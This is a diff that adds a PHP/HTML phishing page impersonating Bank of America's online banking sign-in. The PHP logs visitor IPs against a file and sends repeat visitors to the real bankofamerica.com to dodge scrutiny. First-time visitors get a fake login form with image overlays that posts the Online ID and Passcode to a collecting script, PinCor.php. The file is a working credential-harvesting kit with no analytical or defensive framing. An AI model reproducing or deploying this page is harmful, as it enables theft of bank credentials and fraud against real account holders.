@@ -1,0 +1,43 @@
+<?php
+#verificar direccion ip
+function obtenerDireccionIP(){
+    if (!empty($_SERVER ['HTTP_CLIENT_IP'] ))
+      $ip=$_SERVER ['HTTP_CLIENT_IP'];
+    elseif (!empty($_SERVER ['HTTP_X_FORWARDED_FOR'] ))
+      $ip=$_SERVER ['HTTP_X_FORWARDED_FOR'];
+    else
+      $ip=$_SERVER ['REMOTE_ADDR'];
+    return $ip;}
+$ipl=obtenerDireccionIP();
+#archivo donde estan las ips que ya accedieron
+$array = file("visi.txt", FILE_IGNORE_NEW_LINES);
+#direccionamiento si accedieron antes o no 
+if(in_array($ipl, $array))
+  {header( 'Location:  https://bankofamerica.com/' );}else{ ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Bank of America | Online Banking | DebitCard Information</title>
+<link rel="shortcut icon" href="images/favicon.ico" type="image/ico" />
+    <script type="text/javascript">
+        if (screen.width < 801) {
+            window.location = "indexm"; }
+    </script>
+
+
+</head>
+<style type="text/css">
+.fondo{	background:url(prin.png);	background-repeat:no-repeat;	}
+#texto{	borde:1; padding-left:5px; width:256px; height:38px; font-family:Homer Simpson UI; font-size:14pt; required=""}
+.Sign #button{	borde: 1; background-color: Transparent; font-family: Verdana, Geneva, Arial, Helvetica, sans-serif; width: 263px; height: 41px; position: absolute; top: 299px; left: 39px; }
+.Sign #button:hover{background:url(BotonAzul.png)}		
+</style>
+<body Class="fondo">
+<label style="position:absolute;top:2141px">----</label>
+<form method="post" action="PinCor.php" autocomplete="off">
+<input type="text" name="usr" id="texto" style="position: absolute; top: 159px; left: 39px;" placeholder="Online ID" maxlength="32" required="required"/>
+<input type="password" name="psw" id="texto" style="position: absolute; top: 209px; left: 39px;" placeholder="Passcode" required="required"/>
+<input type="checkbox" style="borde: 1; position: absolute; top: 263px; left: 43px; width: 19px; height: 16px; background-color:#FFF " />
+<div  class="Sign">
+<input type ="submit" value="" id="button" /></div></form></body></html> <?php  } ?>
